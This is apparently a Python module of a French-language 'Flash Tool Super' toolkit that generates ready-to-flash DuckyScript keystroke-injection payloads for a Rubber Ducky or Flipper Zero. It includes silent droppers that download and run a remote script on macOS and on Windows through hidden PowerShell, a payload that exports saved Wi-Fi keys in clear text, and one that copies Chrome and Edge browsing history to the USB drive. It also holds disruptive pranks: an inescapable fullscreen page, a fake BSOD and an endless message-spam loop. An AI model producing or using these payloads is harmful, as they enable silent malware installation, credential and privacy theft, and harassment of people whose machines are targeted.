# modules/badusb.py - 8 payloads DuckyScript generes dans sorties/badusb/
# scripts prets a flasher sur un Rubber Ducky / Flipper Zero (lab autorise)
import os, shutil

OUT = os.path.expanduser("~/Desktop/FlashToolSuper/sorties/badusb")

def ask(label): return input(f"  {label} : ").strip()

def save(name, content):
    os.makedirs(OUT, exist_ok=True)
    p = os.path.join(OUT, name)
    open(p, "w").write(content)
    print(f"  [OK] {p}")
    return p

def prank_fullscreen():
    """page plein ecran invincible - sortie seulement par le combo secret"""
    url = ask("URL de la page piegee (defaut: ta page kiosque)") or "https://example.com/prank.html"
    combo = ask("combo de sortie (touches tapées, ex RICK)") or "RICK"
    d = f"""REM Flash Tool Super - prank plein ecran, combo secret : {combo}
DELAY 1000
GUI r
DELAY 500
STRING open "{url}"
ENTER
DELAY 1500
REM la page kiosk intercepte F11/echap ; sortie = taper le combo {combo}
"""
    save("prank_fullscreen.txt", d)
    print(f"  la page HTML kiosque attend le combo '{combo}' - voir assets/prank_page.html")

def fake_bsod():
    url = ask("URL de la page BSOD") or "https://example.com/bsod.html"
    d = f"""REM fake BSOD plein ecran
DELAY 800
GUI r
DELAY 400
STRING open "{url}"
ENTER
"""
    save("fake_bsod.txt", d)

def dropper_mac():
    url = ask("URL du dropper .command")
    d = f"""REM Flash Tool Super - install silencieuse mac
DELAY 1200
GUI SPACE
DELAY 600
STRING terminal
ENTER
DELAY 1200
STRING curl -sL "{url}" -o /tmp/p.command && chmod +x /tmp/p.command && /tmp/p.command
ENTER
"""
    save("dropper_mac.txt", d)

def dropper_win():
    url = ask("URL du vbs silencieux")
    d = f"""REM Flash Tool Super - install silencieuse windows
DELAY 1200
GUI r
DELAY 400
STRING powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest '{url}' -OutFile $env:TEMP\\p.vbs; Start-Process wscript $env:TEMP\\p.vbs"
ENTER
"""
    save("dropper_win.txt", d)

def wifi_grab():
    drive = ask("lettre USB (ex E)") or "E"
    d = f"""REM exporte les cles wifi sur la cle USB
DELAY 1200
GUI r
DELAY 400
STRING cmd
CTRL-SHIFT ENTER
DELAY 800
STRING netsh wlan export profile key=clear folder={drive}:\\
ENTER
DELAY 600
STRING exit
ENTER
"""
    save("wifi_grab.txt", d)

def wallpaper():
    url = ask("URL de l'image de fond")
    d = f"""REM wallpaper swap prank
DELAY 1000
GUI r
DELAY 400
STRING powershell -WindowStyle Hidden -Command "Invoke-WebRequest '{url}' -OutFile $env:TEMP\\w.jpg; Add-Type -TypeDefinition 'using System.Runtime.InteropServices;public class W{{[DllImport(\\"user32.dll\\")]public static extern bool SystemParametersInfo(int a,int b,string c,int d);}}';[W]::SystemParametersInfo(20,0,$env:TEMP\\w.jpg,3)"
ENTER
"""
    save("wallpaper_swap.txt", d)

def msg_spam():
    msg = ask("message du prank") or "GET SCHWIFTY!"
    d = f"""REM message spammer (prank) - fermeture: gestionnaire des taches
DELAY 1000
GUI r
DELAY 400
STRING powershell -WindowStyle Hidden -Command "for(;;){{Start-Process cmd -ArgumentList '/c','msg * {msg}'}}"
ENTER
"""
    save("msg_spam.txt", d)

def browser_dump():
    d = f"""REM export de l'historique de navigation vers cle USB
DELAY 1200
GUI r
DELAY 400
STRING powershell -WindowStyle Hidden -Command "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History\" 'E:\\history.db' -ErrorAction SilentlyContinue; Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\History\" 'E:\\edge_history.db' -ErrorAction SilentlyContinue"
ENTER
"""
    save("browser_dump.txt", d)
